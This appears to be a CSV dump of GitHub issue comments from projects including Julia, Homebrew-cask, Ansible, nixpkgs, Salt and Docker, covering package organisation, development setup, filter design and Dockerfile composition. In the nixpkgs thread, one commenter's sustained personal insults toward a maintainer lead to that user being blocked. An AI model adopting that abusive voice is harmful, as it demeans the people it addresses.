julia/JuliaLang/11324/104420397,11324," Timeframe will always be bad Removing the package is an equally valid bugfix ;-)  This is where I object to. If there is not enough momentum to maintain this then the code is simply not important and should definitely not be in base. Visibility loss is also something which can be said about almost every package and we need other mechanisms to highlight ""must have"" packages. ",,False
julia/JuliaLang/11324/104423253,11324,"Completely wrong. The perfect time to make major, significant, breaking reorganizations and changes is early in a -dev cycle. We're not early in a -dev cycle, we're overdue for determining scope completion to close the -dev cycle to move to -pre and a release. We've blown past the 6 months for -dev then 3 months in -pre plan already. Not until a replacement is available, tested, and working. And Base is capable of supporting that package working at all. We're way off topic, but the counterargument to that is how few commits to base are necessary to make use of this type of code once it's there and in place. Miles, Iain, etc have very few base commits, but their packages are a major driver of adoption. If Julia has a single killer app right now where it's undoubtedly better than the competition, it's OR, which you can't do at all without sparse matrices. Let's not cause major breakage there by deleting code without preparing a replacement first. ",,False
julia/JuliaLang/11324/104425325,11324,I think this is the core point of Tony's argument and it's completely accurate from what I can see. ,,False
julia/JuliaLang/11324/104426082,11324,"Yes you are right, I agree with that These discussions always end up with a statement that we are off topic. But where if not here should these discussions happen? I did not say first remove it and then do the package. Of course the order is the other way around.  But you are probably right that doing the package is a little bit more complicated due to the binary dependencies. If these were not there it would be a simple copy of the  directory into a new git repo ",,False
julia/JuliaLang/11324/104426730,11324,@friend  What is OR? Does OR require a package? If yes where would be the issue if an additional package is loaded?   ,,False
julia/JuliaLang/11324/104429811,11324,"OR = operations research, aka optimization, so JuMP, Convex, MathProgBase, the solver bindings, and to some extent Optim. Yes these require an external package, and it probably wouldn't be the end of the world to add an additional dependency package to the mix, BUT, it needs to be done right. It's not yet clear to me, as things stand right now, if taking sparse matrices out of base wholesale can leave both parts working as well together as they did before moving them. ",,False
julia/JuliaLang/11324/104433639,11324,"We all want the same thing here, but I don't find the proposal to block a bugfix in favor of a major reorganization as we're trying to finish up 0.4 very convincing. @friend has put his valuable time and effort into developing sparse vectors, and we all have better things to spend our time on than dealing with the fallout of removing everything sparse from Base. ",,False
julia/JuliaLang/11324/109410407,11324,Reading this thread in retrospect taking into account Virals change in the milestone hopefully shows that it could be a good move to decouple the sparse array development from Julia... ,,False
julia/JuliaLang/11324/109423932,11324,"@friend there's still no particularly clean way of both fixing the indexing inconsistency bug with SparseVectors as a package while also avoiding massive package breakage or name conflicts by trying to move sparse matrices wholesale into packages. If you would like to start doing the work to prepare package migrations for some of the functionality that's in base right now, please go ahead and start helping do some of that work. ",,False
julia/JuliaLang/11324/109544184,11324,"I request not bringing off-topic discussions into issues. I also do not see how this conclusion is drawn - but this is a discussion to be had elsewhere. If you do wish to continue this discussion, I suggest the mailing list or an appropriate issue. ",,False
julia/JuliaLang/11324/147981320,11324,Can this be closed in light of ,,False
homebrew-cask/Homebrew/27364/193324356,27364,@friend Started working on this in  but it was never finished. Reported issues where we can see the problem  ,,False
homebrew-cask/Homebrew/27364/265599111,27364,Is anyone assigned to this? Or does this mean it is open to development by anyone who wants to submit a PR to close it? ,,False
homebrew-cask/Homebrew/27364/265601068,27364,Anyone can submit a PR for this. ,,False
homebrew-cask/Homebrew/27364/265606741,27364,"In terms of hours of work invested vs. work pending, I feel the unfinished PR is pretty close to completion. By the time of my last commit (8 Dec 2014), the PR seemed feature complete but lacked a few tests. Now with two years having passed, it’s going to need a very thorough rebase on top of that. I’d definitely love to finish it myself but right now I can’t. I have published all my work in progress to the branch  in my fork. As @friend said, anyone is free to work on it. Whoever wants to contribute should feel free to start from scratch – there are definitely quicker and simpler solutions than my large refactoring – or pick up my  branch if deemed helpful, and finish it, or gut it to their heart’s content. Either way, I’m excited and looking forward to having a  command that works like it should! 😊 ",,False
homebrew-cask/Homebrew/27364/266098124,27364,"Just tried to rebase, ended up realizing there is no core anymore. I had completely forgotten 😳 Given the work already done was rather invasive, I can’t risk missing any relevant changes to the core while rebasing. So I really want a coherent Git history along the way. To achieve this, I’m thinking of multiple steps  Rebase my work against the old  history, stopping at the last commit before the folder was finally deleted;  then, fork the Homebrew repo, branch off the initial commit from August;  commit the result of step # 1 onto that branch, and  continue rebasing normally against brew/master.   @friend/maintainers Any advice on a simpler solution? How did you go about similar problems in the past? ",,False
homebrew-cask/Homebrew/27364/266175371,27364,Not really. Before moving the core we tried to merge as many core-related PRs as possible. The remaining ones were either closed due to lack of interest or merged relatively quickly afterwards. ,,False
homebrew-cask/Homebrew/27364/266258007,27364,"@friend Alright. I wonder though what would be the proper way to run any cask command from my dev working copy? Before the transition, we used to have  and  to switch modes. These used to be a piece of cake and was well documented. I wonder where the equivalent thing in Homebrew is? I searched all the folders I deemed somewhat relevant, especially , , , , and of course, the  subtree, but nothing helpful has turned up there. The consequence is that right now, I’m unable to run literally any command from my dev working copy of Homebrew. I have read all the docs – especially the three documents for maintainers – however, I have yet to find anything even remotely related to my issue, or even some kind of documentation on how to properly set up the Homebrew repo for development. Nothing has worked so far. My simplest test case is I look at the commit hash that  gives me. So far, it has never been the one that corresponds to the HEAD of my repo. Speaking of test cases not only are the  scripts gone; someone also seems to have removed almost all of the test tasks from our , which is in the new  directory; this of course broke both  and . This apparantly happened some time after the transition. I wonder how you manage to run any core test cases now? (The documentation to Homebrew does mention “test bots” – however, these are probably not suitable for quickly testing along as I do changes to the core. Also, I can’t access those anyway.) I understand that I’m obviously missing something – but what is it? After one day of achieving literally nothing, I’m running out of ideas and feel really confused and frustrated. Would you mind please giving me a nudge in the right direction? ",,False
homebrew-cask/Homebrew/27364/266264145,27364,"As far as I can remember the scripts were linking the development tap to , so these were removed because they wouldn't have worked anymore, as the  command is now integrated into Homebrew. Now you will either have to checkout to a different branch in the  while developing, or set up a separate Homebrew installation. Tests are now run with , which you can find in . However, I am currently in the process of merging these with . ",,False
homebrew-cask/Homebrew/27364/267471968,27364,"@friend Thanks for the pointers! I don’t see how these two things are related. If we’re able to move a thing from A to B, how are we not able to modify those scripts to have them point to B instead of A, rather than throwing them away? That, admittedly, is a little beyond me. To explain the itch behind my question, I’m going to let you guys in on the fact that I find myself having a embarrassingly hard time getting my dev environment up and running, especially when compared to the old HBC repo. This factoid is seemingly unrelated to the discussion at hand, and it might not have anything to do with Homebrew, and might very well have everything to do with my personal attitude, learning curve, or patience. Except when it doesn’t. The thing is, I was bitten once and became shy twice. I do love Homebrew, you know. It’s a pleasure to use, and certainly an insanely convenient thing to have. I do also love . But boy, have I learned to steer clear of ever standing in its merry way. To back up my claim, I just need to look at my local working copy of HBC. Not a long time ago, I used to know exactly how, and when, to , mainly thanks to . Never did I break, let alone lose, any of my work on a Cask or the HBC code. Now compare to all this my stash of custom Homebrew formulae. I’ve written only a handful of those throughout the years. Nothing spectacular, and all of them for my own use. Sometimes my formulæ even have credentials in it because who cares. I used to tuck away all those formulae of mine in private branches but guess what? One day in 2015, my formulae started to disappear. My uncommitted changes? Vanish into thin air. My branches? Poof. At first, I would not notice – because whatever it is that keeps snatching my formulae, the thing loves to strike silently, probably out of spite, or maybe because it secretly longs to be a ninja. By all means, it chooses not to blow up in my face like Git does whenever it finds a hairline crack in a whitespace (but wait … didn’t Homebrew use exactly Git behind the scenes? … Oh right, they use  now. My bad). So, weeks pass, or even months, without me noticing my formulÆ are gone, until the day there is some upstream release, and off I go and update formula XY, or so I think! Actually, I can’t update formula XY because formula XY is gone. Gone because someone decided to change the color of the magic smoke inside  once again and the old smoke took with it all the feature branches, or stashes, with my custom formulæ in them. Do I bother? Keg no. I usually just shrug and move on with my life because I’m a big girl and I can cope with worse things than the fact that formula fidgeting and  magic are just not my thing. But now that HBC is with Homebrew, all of that has changed, I guess? No more weaseling out of staying on top of how  works internally this season! Gonna have to bite the bullet and learn how to , and how not to have my stuff ninja clobbered, right? Because – albeit admittedly on-and-off – I am a Homebrew-Cask core maintainer and I plan to remain one for years to come. Yes, I’m going to bite the bullet and work on the HBC core in a private branch, below , and stop complaining, and become a socially likeable person again. But before I do that, may I ask the simple question Why exactly is it that we cannot keep  and  around? Pinging @friend/maintainers for advice, consolation, or both. ",,False
homebrew-cask/Homebrew/27364/267601212,27364,"To be honest, I hadn't used these scripts before the merger, so there wasn't any incentive for me to make them work with the new setup, and nobody complained when they were gone. Also, keeping them in  doesn't really make sense anymore since this is now just a Tap. I can't say anything about this since I never had any trouble with , but I understand your frustration and therefore need to have a decoupled development copy. Much of Homebrew-Cask is now intertwined with the Homebrew core, and will only get more integrated over time, so you will probably end up editing the Homebrew core anyway – ~~~~, basically. Of course you could argue that the scripts can be adapted to edit the Homebrew core instead, but I think it's really a matter of personal preference if you want to work directly inside the production  or  a second development copy. ",,False
homebrew-cask/Homebrew/27364/267633770,27364,"It’s not that I’m trying to bring back this feature purely for my own convenience. Let’s put ourselves – for a moment – in the shoes of a first-time code contributor who has just cloned the repo to, say, , has written some code, and is now just about to test their first PR. Is it then not poor UX&lt;sup&gt;[1](#footnote-1)&lt;/sup&gt; to have them learn to their surprise that there’s no way to run the code they just built? For the record, I’m positive that whoever removed the scripts did it with the best of intentions in mind. This doesn’t change how unhappy I am with the status quo though. &lt;p id=""footnote-1""&gt;&lt;sub&gt;&lt;strong&gt;[1]&lt;/strong&gt; or dev’s experience, in that instance&lt;/sub&gt;&lt;/p&gt; Lucky you. 🍀  But even in a bug-free universe, where  plays with kittens, I believe the UX aspect (see above) is still crucial in the long run. Contributing code needs to be accessible for anyone with a GitHub account. You’re correct; it’s not what I had in mind either. Basically, what I want to achieve here is a workflow roughly similar to what we had before the transition. To get more precise, what I’m trying to do is this   Step Status Description     Step 1 Normal I choose a location in the filesystem, e. g. .   Step 2 Normal I  the complete Homebrew repo to , either from the official repo or from my own fork.   Step 3 Normal → Linked I’ve just written some code, now I need to test it. Thus, I run .   Step 4 Linked From now on, whenever I say &lt;sup&gt;[2](#footnote-2)&lt;/sup&gt;, it’s going to do the exact thing that  says instead of what  says &lt;sup&gt;[3](#footnote-3)&lt;/sup&gt;.   Step 5 Linked → Normal I have finished my work. Now I’m ready to go back to production mode; thus, I run .   Step 6 Normal All is back to normal. I can run . In particular, my work in  is completely safe from the grasp of .    &lt;p id=""footnote-2""&gt;&lt;sub&gt;&lt;strong&gt;[2]&lt;/strong&gt; Let’s ignore the non-cask  commands for now. I’d be indifferent as to where those would point.&lt;/sub&gt;&lt;/p&gt;&lt;p id=""footnote-3""&gt;&lt;sub&gt;&lt;strong&gt;[3]&lt;/strong&gt; or whatever  happens to be at that moment&lt;/sub&gt;&lt;/p&gt;What I’d love to do is write a script that simply does what the table says. At the moment, I have no idea how to go about that, or where to start looking for a solution. If I knew more about Homebrew, or if someone kindly helped me fill in the blanks, I would gladly implement the script myself, and then send a PR on its way. Another strategy might be to do simple symlink trickery, like the old scripts did. (If I only had an idea what precisely needs to be linked, and to which target?) If I knew, I could restore  and just change it there. @friend/maintainers Any pointers? ",,False
homebrew-cask/Homebrew/27364/267641003,27364,"You know what? You could probably just simply call  aliased as  or the like. This way  is safe, even if you forget to run . ",,False
homebrew-cask/Homebrew/27364/267641799,27364,"Thanks @friend, will try this right away! ",,False
homebrew-cask/Homebrew/27364/269709568,27364,@friend The solution you suggested has worked great so far! Exactly what I needed to get going. 👍  Cloning into 'brew'... […] $ cd brew Homebrew-Cask 1.1.5-66-g4ca2eaf caskroom/homebrew-cask (git revision de574; last commit 2016-12-29) $ bin/brew cask --version ==&gt; I’m in the dev repo ♠ ,,False
homebrew-cask/Homebrew/27364/269768407,27364,Great to hear! 👍 ,,False
homebrew-cask/Homebrew/27364/269781074,27364,Can also attest to that. Used it for ,,False
homebrew-cask/Homebrew/27364/461307157,27364,This issue has been automatically marked as stale because it has not had recent activity. It will be closed if no further activity occurs. ,,False
homebrew-cask/Homebrew/27364/461651970,27364,"@friend I seem to recall some discussion not too long ago (was already 2019?) in either the Homebrew/brew or Homebrew/homebrew-core repo about this very subject, and the conclusion being that it’s best to avoid having formulae in third-party taps whose tokens conflict with the official taps. Is this issue still worth pursuing? ",,False
homebrew-cask/Homebrew/27364/468502432,27364,This issue has been automatically marked as stale because it has not had recent activity. It will be closed if no further activity occurs. ,,False
core/owncloud/2862/13045944,2862,"What's worse is I don't seem to be able to ignore/use Apache's dontlog syntax to resolve it. grep -c PROPF /var/log/httpd/httpd-access.log     2802  That's about 1/4 of the logged requests. PROPFIND and GET requests account for about 4200 requests. This syntax works for other URI requests     SetEnvIfNoCase Request_URI ""^PROPFIND"" dontlog  but not for those. Requests from the desktop/browser are cheerfully ignored but not from the mini-client. I thought it might be something in Apache that sets authenticated requests aside and always logs them but the desktop/browser test disproved that. I find I can't even filter by IP address they still get logged. I haven't had an opportunity to capture and examine packets to see what's ado. It's a low priority issue as I can't use owncloud properly (i.e., with encryption) due to my ISP's peculiar attitudes about security. But perhaps an annoyance that needs sorting. ",,False
core/owncloud/2862/22272807,2862,I’m closing this issue because it has been inactive for a few months. This probably means that the issue is not reproducible or it has been fixed in a newer version. Please reopen if you still encounter this issue with the latest stable version (currently ownCloud 5.0.9) and then please use the issue template. You an also contribute directly by providing a patch – see the developer manual. ) Thank you! ,,False
ansible/ansible/46215/364529796,46215,"SUMMARY I'd like to be able to use the combine-filter but merge in reverse order. ISSUE TYPE  Feature Idea  COMPONENT NAME No idea ADDITIONAL INFORMATION One common pattern that I return to when constructing Ansible roles is to have some variables for the role described (with defaults) in  and then apply some defaults or transformations to that data inside  (prefixing the variable with  to make it clear that the variable is internal and manipulated). Example defaults/main.yml vars/main.yml This allows me to define my variables in my inventory like this inventory/development/group_vars/database/vars.yml …while not having to put lots of -filters in my task files. Now to my problem. See the  definition above. If I could reverse the merge-order of combine I could define it like this instead vars/main.yml Which reads a lot nicer. I use the above approach when I want to override something in a list of objects (which comes up more seldomly) yaml _db_user_overrides   admin false _db_users &gt;-   {{ db_users | map('combine', _db_user_overrides) | list }} ♠ Solution(?) Either a -filter or a new key to the -filter would do. Maybe  or  (as in left-to-right merge). ",,False
ansible/ansible/46215/425136209,46215,"Files identified in the description  lib/ansible/inventory lib/ansible/modules/files/file.py lib/ansible/modules/packaging/os/apt.py lib/ansible/parsing/utils/yaml.py lib/ansible/playbook/role test/integration/targets/apt/defaults/main.yml test/integration/targets/binary/vars/main.yml  If these files are inaccurate, please update the  section of the description or use the  bot command. click here for bot help  ",,False
ansible/ansible/46215/425136216,46215,cc @friend click here for bot help  ,,False
ansible/ansible/46215/425146125,46215,"soo, why not just switch the variables? is the same as your example w/o requiring a new keyword ",,False
ansible/ansible/46215/425361948,46215,Is it though?  is a dict and not a list. Not sure what applying the  filter on a dict would do. ,,False
ansible/ansible/46215/425363459,46215,@friend Here's a test of your suggestion combine.yml ,,False
ansible/ansible/46215/425371186,46215,If there was a -filter that took input and produced a stream of  copies of it I could do something like this The replicate filter would work like this So that's another solution to my problem. /Mattias — who's aware that he's very focused on his particular problem right now ;) ,,False
ansible/ansible/46215/425376958,46215,I'll try to implement this as a filter-plugin in my local repository and see if I can get it all to work. Would you be interested in a PR then later? ,,False
ansible/ansible/46215/425423184,46215,Added a PR for this. ,,False
ansible/ansible/46215/425443130,46215,"combine takes N dictionaries, all terms need to be dicts, it should not work if any is a list no matter the order. The issue here is your use of map more than the issue with the combine filter itself ",,False
ansible/ansible/46215/425467027,46215,"Well... Also the code was based on your suggestion. No it's not. One might add support for my use case by extending  instead of , but there really isn't an issue with my use of map. I'm not trying to split hairs here. Rather I'm trying to communicate an issue with the way you communicate. It really is unnecessarily provocative. Please try to drop the attitude. ",,False
ansible/ansible/46215/425474167,46215,"sorry, i might have phrased that better, its not that you are using map incorrectly, its that you are using map at all that is the issue here. This is a limitation of map, not combine. ",,False
ansible/ansible/46215/425481607,46215,Thanks! All good 😊 ❤️ I agree with your premise and I'll continue the discussion in the PR. I have some other ideas that might be helpful as well! ,,False
ansible/ansible/46215/464418595,46215,"Files identified in the description None If these files are inaccurate, please update the  section of the description or use the  bot command. click here for bot help  ",,False
ansible/ansible/46215/472522411,46215,"I found a hacky solution for this use case First, combine each dict with the defaults (override with defaults). Then, zip these n ""defaults"" with each dict and finally map these tuples of dicts using combine. Example This is how you create a new users dict, with defaults applied ",,False
ansible/ansible/46215/472823048,46215,"I've done lots of those. ♥ Eventually started writing my own filters that I put together with my playbooks. Mmmm, I love this! 😂♥ ",,False
nixpkgs/NixOS/27258/241526242,27258," should be using the POSIX 2008  instead of fgets. If, for some reason there are targets that do not have POSIX 2008, add configuration flags to also accommodate for non-POSIX 2008 systems, develop a NixOS module to control this behavior with sane defaults set depending on the platform (which also should be integrated with the installer eventually). (Feel free to create other tickets for these tasks, if need arises.) @friend Version master ",,False
nixpkgs/NixOS/27258/313923818,27258,"I don't use NixOS/nixpkgs anymore, so feel free do do what you want, but with regards to your claim that it should not use ""brittle"" C functions you have to substantiate such claims, i.e. prove what supposedly makes  (which has well defined behaviour) ""brittle"" in this specific context. @friend ",,False
nixpkgs/NixOS/27258/313926173,27258,"Seems to me that if the user enters a NUL, the current code will ignore everything the user enters after the NUL (strlen stops at first NUL, whereas fgets is happy to continue reading until newline). If users feed binary data to this program, the input key passed to the kdf may be substantially shorter than expected. No idea if there are any practical implications re how this program is intended to be used, though. ",,False
nixpkgs/NixOS/27258/313927667,27258,"Correct, but using  won't change that, since the required delimiter would still be a newline. The pbkdf2 wrapper (and that program is nothing more) exists to derive a binary key from a non-binary (human memorable) passphrase + binary (hex encoded) salt. If you already had a binary key, you wouldn't need to use a kdf. ",,False
nixpkgs/NixOS/27258/313930697,27258,"Truncation occurs because of , which  solves by reporting the number of bytes it read.  Presumably, the strength of the derived key would be unaffected by truncation, but it seems recovering the key could accidentally become easier. As long as users never feed strange inputs to the program, there's no problem, but I think it's unfair to discount the potential (whether or not it's worth doing anything about it). ",,False
nixpkgs/NixOS/27258/313933720,27258,"Thanks, I overlooked that; this is a good argument for replacing the + pair with , though as I said, I haven't used this (in a long time) and unless someone else still does you should just drop the whole thing (and keep it from bitrotting further). No, because the derived key is used exclusively for accessing an already encrypted LUKS volume. The input is retrieved via explicit shell prompt at boot time and then fed into the program and you can't enter a null byte on the kernel tty (so you wouldn't use one when setting up the LUKS volume, anyway). ",,False
nixpkgs/NixOS/27258/313949624,27258,There is a reason I remembered this quote when I read your message. ,,False
nixpkgs/NixOS/27258/313950378,27258,"That's your prerogative, but irrelevant to the issue at hand. ",,False
nixpkgs/NixOS/27258/313954390,27258,"@friend What is the issue at hand according to you? I can imagine that technically and even mathematically there is no problem, but the thing is, I don't even want to read an explanation of an analysis written by in this case the original author. Not because I don't believe it to be correct, but it's because I don't want someone else to also have to understand that analysis in order to believe the code works. It's simply more costly from a maintenance point of view to require such reasoning. Consider that someone wants to call this code from another context and then the whole analysis needs to be done again (and typically is never done and it results in a bug). Also note that you haven't even documented a valid input specification. Really, your code is just a disaster waiting to happen and you apparently need to have this explained multiple times before you get it, and perhaps you will never get it. There are more issues with your code, btw. For example, you make implementation choices when applying an algorithm that are not referenced to scientific literature or with any other kind of justification. In short, I would consider this code written by someone who can instruct a computer what to do, but just lacks the wisdom to tell the computer the right things to do. ",,False
nixpkgs/NixOS/27258/313963652,27258,"The issue is that (as written above) the + pair should be replaced by  iff. it's worth for this project to keep the functionality provided by the semantic block it belongs to. That's not for me to decide, since I don't use it anymore. Again, your prerogative, but not relevant to the issue at hand. That is always the case if one reuses a piece of code in another context. This is not new. That's a mistake of the person reusing C code for another purpose without doing the proper analysis. Of course not, it's an internal component, not part of a public interface. The code will result in disaster when someone abuses an internal component for a different purpose without analysing whether its applicable. Your continued ad hominem attacks (after providing an incomplete bug report) remain irrelevant. That would only be an issue if the derived key was used for something other than decryption of preexisting encryption. As I have pointed out before, your personal attacks serve no purpose with regards to this issue. ",,False
nixpkgs/NixOS/27258/313972404,27258,@friend The hole you been digging for yourself is now so deep that all I have to do now is to give you a little push. Did you know your C program has undefined behavior? ,,False
nixpkgs/NixOS/27258/313974449,27258,"Since after a civil reminder you insist on keeping up the hostile and - frankly - abuse behaviour, I won't spend more of my time on you ) ",,False
nixpkgs/NixOS/27258/314022707,27258,"@friend You are the one who kept insisting that the code was good and that only if others would make a mistake (implying that you are the god of programming) that there would be an issue. Then finally, when I have carefully positioned you such that there is no escape left, you start to cry like a little baby about how hostile I am? You were acting as the most obnoxious person I have ever seen here and you needed to be taught a lesson in humility. The trait most people like you have is that they are unaware of their own limitations and they just keep on sharing their incompetence with the rest of the world. It is pathetic. ",,False
nixpkgs/NixOS/27258/314057285,27258,"@friend I've blocked you from the NixOS organization. This isn't the first time you've engaged in personal attacks on contributors, and I've had enough. ",,False
nixpkgs/NixOS/27258/314073889,27258,"@friend Don’t let that behaviour get to you; the person suddenly appeared a few days ago (see their profile) and started commenting hundreds of issues/PRs, always with a doubtful attitude. I wasn’t sure what to make of it because it seemed like they were contributing, but apparently they just wanted to burn stuff. Nothing gained nothing lost I’d say. ",,False
nixpkgs/NixOS/27258/314383511,27258,"I approve @friend actions, FYI. @friend you're very welcome to reopen the PR, I'll review it shortly. ",,False
salt/saltstack/49765/363390972,49765,"Description of Issue/Question Don't understand the attitudes of the people on IRC Setup I am deploying windows machines. The deployment system auto installs salt with the correct salt ID's (that's pretty neat but I won't go into details). The salt ID's are partially based on a date stamp and remain permanent for the life of the PC. They are effectively the true names of the PC's. The deployed machines are not set up to automatically domain join. Partly because the Windows computer names names are somewhat in flux. Partly because my boss and co-workers don't want our credentials stored anywhere To domain join I create an sls file which can be invoke by the sysamin. The runner will ask for a user name and password and pass that as pillar data. The intended computer names come out of an external pillar (stored in a postgresql db). The runner then just applies the state and the PC's join with their intended names. I've been testing this today and it's working well, but people on the #salt irc channel were giving me flak and insinuating that I'm an idiot. BTW i don't care if i am an idiot. I just want to know why anything I'm doing is worse than anything anyone else does. I have asked #windows people ""how do you join 100 machines?"". This is the conversation So there you have it, the typical process involves someone ineracting with 100 machines. I avoid all that. Why am I being criticised? ",,False
salt/saltstack/49765/424199511,49765,"Hi @friend. I lead the core maintainers team at Salt. I'm sorry you felt criticized. In the morning, I'll ask somebody on @friend/team-windows to try to help you with your question specifically. I do want to respond, however, to your comment about the ""vision of management"" of Salt to ""extend in every direction"". As the principal maintainer of this project, my view is one of great pride that people in our community are trying to offer what they may see as the best solution for a problem, regardless of whether or not that answer involves Salt. While I hope that we can always continue to grow the project to cover more ground, If another solution for a given problem is better than ours, I hope our community continues to have the integrity to heartily recommend it over Salt in the interest of being as helpful as possible instead of merely dogmatic. That said, I hope you'll keep using Salt and, as I said, I'll make sure the Windows folks get in touch with you in the morning to see if there's a way that Salt can be made to work in a way that solves the problem you're concerned with. Best, -Mike ",,False
salt/saltstack/49765/424200620,49765,"@friend I don't need any help specifically. All of the specific technical problems I was having are resolved. My first question was ""how could this be done better without salt"", since people were implying that it could. I couldn't think of any solution that would be substantially simpler in terms of number of operations. I'll forget about the scond point I was making for the time being. ",,False
salt/saltstack/49765/424255317,49765,"I assume above is the main point of this issue. There is a slack channel for windows help. Slack keeps a few days worth of history, so if people are not constructive in their comments  its more noticeable. (Invite sent to you email address) ",,False
salt/saltstack/49765/450513347,49765,I'm sorry about this. Anyway I've come up with a much better system thanks to some of the help I got on slack. Thanks to all the people who have helped me with suggestions so far. ,,False
moby/moby/3378/24853626,3378,"I have several Dockerfiles to build images which eg setup a postgresql client, set up a generic python app environment I want to make a Dockerfile for my python webapp which combines both those images and then runs some more commands If I understood the docs correctly, if I use  a second time I start creating a new image instead of adding to the current one? ",,False
moby/moby/3378/295133077,3378,"Here's the thing, I don't necessarily need merge. I think a lot of the problems could be solved with a rebase. My normal use case is A (ubuntu) -&gt; B (e.g. nginx) A (ubuntu) -&gt; C (e.g. node) And I want a combined B &amp; C image. Usually they don't have anything to do with each other, so it would be sufficient just to rebase all the diffs between A and C onto B. i.e. A -&gt; B -&gt; C' That seems like a simpler problem to solve. ",,False
moby/moby/3378/295143655,3378,"@friend Typically Node.js applications don't need this feature to work with Nginx (in my opinion). Docker way would be two containers, one for Nginx, the other for Node. We configure Node container to expose its port only to the Nginx container, and let Nginx container to listen to the public port (like 80). Any reason why Nginx needs to be in the same container as Node? ",,False
moby/moby/3378/296356475,3378,@friend I appreciate the reply. I actually just used two random services as an example. My usual use case would be starting with a generic service (e.g. node based off of ubuntu) and a custom image of my own (also based off of ubuntu) and wanting to combine them. ,,False
moby/moby/3378/296374380,3378,"btw, it's not exactly rebasing but opens up a lot of use-cases for Dockerfiles. Dockerfile now supports multi-stage builds. Example You can have as many stages as you like. The  parameter basically switches the context to the specifed build target name. When you , the resulting image called  will be from the last stage. You can also build specific stages with , for example. There's a few other very nice Dockerfile enhancements in 17.05 (currently available as RC1), give it a try! ",,False
moby/moby/3378/296429252,3378,Now that is interesting! I didn't know you could do that. I'll have to give that a try to see if it solves my common use cases. ,,False
moby/moby/3378/304155567,3378,"While this is a great feature, having tried it out it doesn't really solve my most common problem. I just ran into it again today. I would like a Jenkins image that has Docker installed so that I can build from within the container. The fact of the matter is that there's no way to do this without replicating the install process of one or the other in my Dockerfile. This is a case where the blinkered arguments about this not being necessary since each container should only be one service obviously don't apply. My ""one service"" combines the functionality of Docker and Jenkins. ",,False
moby/moby/3378/304160208,3378,So you want to smash two dockerfiles into one so you don't have to copy/paste stuff? ,,False
moby/moby/3378/304161640,3378,Copy/paste is the equivalent of forking in this case. What I want to do is avoid forking a Dockerfile so I don't miss out on bug/security improvements or other changes when it invariably changes later on. ,,False
moby/moby/3378/315121528,3378,"Can't just pass by. Looking for a way to distribute changes over a long chain of images inheritance (deeper than 2). Multi-stage doesn't seem to be the thing that claryfies a problem. Having an entity that could contain just block of directives, allowing me to include it into all my inheritor images, together with base image functionality looks like rational evolution. ",,False
moby/moby/3378/318867258,3378,"For those wondering the right way to do this, from a Docker perspective, take a few minutes to review  he creates an entire tree of Dockerfiles.  As you go down the tree, you find different combinations of dependencies, each FROM the level above in the tree.  So if you followed the tree from  -ubuntu-&gt;common-deps-&gt;python3-&gt;deepLearningBase-&gt;pyTorch  + -ubuntu-&gt;common-deps-&gt;python3-&gt;deepLearningBase-&gt;TensorFlow -ubuntu-&gt;common-deps-&gt;python3-&gt;deepLearningBase-&gt;TensorFlow-pyTorch` Now, you still have to make a dockerfile that combines pyTorch and TensorFlow dockerfiles, but they key is that those files will be VERY SIMPLE, just a couple lines of install on top of deepLearningBase. So what is really needed is for several Larger-scale github repositories like this, for different ""worlds"", such as Web Development, Deep Learning, Embedded software, etc. Then you would just follow the tree to your required build, and if no one else made it yet, just add a node and combine 2 or 3 apt-get lines and make your new environment. ",,False
moby/moby/3378/319159200,3378,"That looks like the ""choose-your-own-adventure"" style of composition. INCLUDE would be a lot simpler. Hell, I just want to compose a specified  image with  so I don't have to install nano from apt-get every time! ",,False
moby/moby/3378/340609550,3378,"I concur with @friend in his above comment. There's no reason this shouldn't be possible in most cases (conflicts should be fairly rare, as they are on manually-managed OSes). ",,False
moby/moby/3378/365619819,3378,I have introduced a YAML configuration file which allows macros ,,False
moby/moby/3378/381449355,3378,"This is a use case quite similar to the one @friend commented, where neither @friend 's solution, neither multi-stage builds commented by @friend apply  A (debianstretch-slim) dockerfileAB -&gt; B (pythonslim-stretch) dockerfileAC -&gt; D ([build-stage] python-slim) dockerfileDE -&gt; E (ghdl/extvunit)     dockerfileAC -&gt; C (ghdl/runstretch-mcode)    where  The steps from A to C are exactly the same as those from B to D (dockerfileAC). The development team of B knows nothing about C, D or E. The development team of C knows nothing about B, D or E.  A user willing to build D (and/or E), must have access to dockerfileAC, but it is not required to know about dockerfileAB. Therefore, the user must have a better understanding of one dependency (C) than the other (B). Ideally, it should be possible to rely on teams A and B, and just build D as either  (merge) or  (rebase). Because GHDL is not a web service and VUnit is not a web client, both tools need to be installed in the same image/container (E). Multi-stage builds are not useful, because we need to build a (probably unknown) dockerfile with two  labels, it is not a single forward chain. If find this use case similar to the merge/rebase of two git branches sometimes there are no conflicts, sometimes the conflicts are easily resolvable, sometimes it cannot be merged at all because there is no common history... Is there any tool, either official or external, that provides this feature? ",,False
moby/moby/3378/386082371,3378,"Amazing this is still an issue and topic. How hard is it to ""INCLUDE someimage"", then when parsing it, check the base is compatible (in the FROM chain) and if so, execute the rest of THAT file at that point (as if I had copied the Dockerfile from the project and pasted it into mine)? The whole ""people will do bad things they don't realize"" excuse is absurd in this context. This is already insanely complex and that why we need this to help simplify it. ",,False
moby/moby/3378/386109133,3378,"@friend This is an entirely unhelpful comment. There are basically two reasons for it's why it's not one, either  It's not so easy No one has taken the time to do the work.  In reality, it is usually both. ",,False
moby/moby/3378/386113417,3378," It's a parsing and string-replace problem that any new coder could accomplish in all of 10 minutes IF they knew where in the code. I'm not saying it would be usable in all cases, but for the limited cases I'm seeing suggested here over and over (where bases are effectively common), it's a dead-ringer.  Of course not, this thread provides ~101 reasons it can't or shouldn't be done, so why would anyone think to do it regardless?   On the other hand, my comment serves (like SO many others here) to demonstrate that there is a need and with the hope to influence either the obstructing attitudes or to at least act as a reminder. If that's ""entirely unhelpful"", then you've just explained why this issue (ignored feature request) is still here and active and it's not a technical one and I'd point to your hollow post with little in the way of helpful facts, information or even opinions. ",,False
moby/moby/3378/386116555,3378,"It's way more than parsing a string. Docker and the Dockerfile is used by millions of people. Adding API's is a significant thing... even outside of that the underlying implementation is not ""parsing a string"". In any case there's many proposals to solve the problem and this is a very old and closed issue. ",,False
moby/moby/3378/386413028,3378,"I do think that if Docker doesn't figure out a clean solution to this scenario, it will probably be replaced by whatever tool does figure it out. I noticed one of my colleagues using the following pattern, which might be a decent workaround I haven't tried it myself though, so I'm not sure how it would work in practice, e.g. how it behaves with caching, etc. ",,False
moby/moby/3378/386433765,3378,"Indeed, this is a very important problem, and hasn't been addressed properly. I'm amazed a company as big as Docker haven't tackled it yet. ",,False
